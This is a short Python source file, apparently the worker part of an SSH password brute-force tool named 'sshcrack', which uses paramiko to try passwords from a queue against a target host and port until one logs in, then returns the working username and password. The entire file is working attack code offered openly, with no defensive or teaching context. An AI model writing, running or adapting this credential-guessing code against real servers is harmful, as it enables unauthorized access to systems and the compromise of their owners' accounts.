
import time
import paramiko

class sshcrack:
    def __init__(self,args):
        self.args=args

    def run(self,passwd_list,result,username):
        while True:
            try:
                passwd=passwd_list.get(timeout=1)
            except:
                result.put(1)
                exit(1)

            try:
                #print(self.args)
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=self.args[1], port=int(self.args[2]), username=username, password=passwd)
                result.put((username,passwd))
                exit(1)
            except Exception as e:
                    print(" ERROT----- (Username:%s  Passwd:%s)" %(username,passwd))
            finally:
                ssh.close()
